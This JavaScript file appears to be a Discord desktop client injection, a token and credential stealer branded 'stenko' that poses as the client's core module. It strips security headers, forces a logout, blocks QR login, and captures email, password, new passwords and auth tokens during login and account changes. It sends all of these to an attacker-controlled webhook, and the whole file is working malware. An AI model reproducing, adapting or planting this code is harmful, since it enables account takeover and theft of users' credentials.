const fs = require('fs');
const path = require('path');
const { BrowserWindow, session } = require('electron')
const querystring = require('querystring');
var webhook = "%WEBHOOK_LINK%";

const config = {
    "clr": 3092790
}

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "stenko"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "stenko"));
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    return !1
}
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}


	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}

})
const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (details.url.startsWith("wss://")) {
			callback({
				cancel: true
			})
			return;
	}
	if (FirstTime()) {}

	callback({})
	return;
})
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
    if (FirstTime())
        if (details.url.startsWith("wss://")) {
            callback({
                cancel: !0
            })
        } else {
            callback({
                cancel: !1
            })
        }
})

function SendToWebhook(what) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
}

function GetNitro(flags) {
	if (flags == 0) {
		return "no nitro"
	}
	if (flags == 1) {
		return "nitro classic"
	}
	if (flags == 2) {
		return "nitro boost"
	} else {
		return "no nitro"
	}
}

function GetRBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "discord staff "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "partnered server owner "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "hypesquad events "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "bug hunter tier 1 "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "early supporter "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "bug hunter tier 2 "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "verified bot developer "
	}
	if (badges == "") {
		badges = "no badges"
	}
	return badges
}

function GetBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const House_Bravery = 64;
	const House_Brilliance = 128;
	const House_Balance = 256;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "discord staff "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "partnered server owner "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "hypesquad events "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "bug hunter tier 1 "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "early supporter "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "bug hunter tier 2 "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "verified bot developer "
	}
	if (badges == "") {
		badges = "no badges"
	}
	return badges
}

function userloggedin(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "stenko",
            content: "",
            avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
            embeds: [
                {
                    "title": "user logged in",
		    "description": "᲼᲼᲼᲼",
                    "color": config["clr"],
                    "fields": [
                        {
                            "name": "user",
			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
                            "inline": true
                        },
                        {
                            "name": "id",
                            "value": `\`` + json.id + `\``,
                            "inline": true
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        },
                        {
                            "name": "email",
                            "value": `\`${email}\``,
                            "inline": true
                        },
                        {
                            "name": "password",
                            "value": `\`${password}\``,
                            "inline": true		    
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        }, 
                        {
                            "name": "badges",
                            "value": `\`${GetBadges(json.flags)}\``,
                            "inline": true		    
                        },
                        {
                            "name": "nitro",
                            "value": `\`${GetNitro(json.premium_type)}\``,
                            "inline": true		    
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        }, 
                        {
                            "name": "token",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": "stenko premium version",
			"url": `https://stenko.xyz`,
                    },
		    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": ""
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function passwordchanged(email, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "stenko",
            content: "",
            avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
            embeds: [
                {
                    "title": "password changed",
		    "description": "᲼᲼᲼᲼",
                    "color": config["clr"],
                    "fields": [
                        {
                            "name": "user",
			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
                            "inline": true
                        },
                        {
                            "name": "id",
                            "value": `\`` + json.id + `\``,
                            "inline": true
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        },
                        {
                            "name": "email",
                            "value": `\`${json.email}\``,
                            "inline": true
                        },
                        {
                            "name": "new password",
                            "value": `\`${newpassword}\``,
                            "inline": true		    
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        }, 
                        {
                            "name": "badges",
                            "value": `\`${GetBadges(json.flags)}\``,
                            "inline": true		    
                        },
                        {
                            "name": "nitro",
                            "value": `\`${GetNitro(json.premium_type)}\``,
                            "inline": true		    
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        }, 
                        {
                            "name": "token",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": "stenko premium version",
			"url": `https://stenko.xyz`,
                    },
		    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": ""
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function emailchanged(newemail, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "stenko",
            content: "",
            avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
            embeds: [
                {
                    "title": "password changed",
		    "description": "᲼᲼᲼᲼",
                    "color": config["clr"],
                    "fields": [
                        {
                            "name": "user",
			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
                            "inline": true
                        },
                        {
                            "name": "id",
                            "value": `\`` + json.id + `\``,
                            "inline": true
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        },
                        {
                            "name": "email",
                            "value": `\`${json.email}\``,
                            "inline": true
                        },
                        {
                            "name": "new password",
                            "value": `\`${newpassword}\``,
                            "inline": true		    
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        }, 
                        {
                            "name": "badges",
                            "value": `\`${GetBadges(json.flags)}\``,
                            "inline": true		    
                        },
                        {
                            "name": "nitro",
                            "value": `\`${GetNitro(json.premium_type)}\``,
                            "inline": true		    
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        }, 
                        {
                            "name": "token",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": "stenko premium version",
			"url": `https://stenko.xyz`,
                    },
		    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": ""
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

const passwordchangedfilter = {
	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(passwordchangedfilter, (details, callback) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const password = data.password;
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
				userloggedin(email, password, token)
			}))
		} else {}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != undefined && data.password != "") {
				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						passwordchanged(data.password, data.new_password, token)
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						emailchanged(data.email, data.password, token)
					}))
				}
			}
		} else {}
	}
});
module.exports = require('./core.asar')
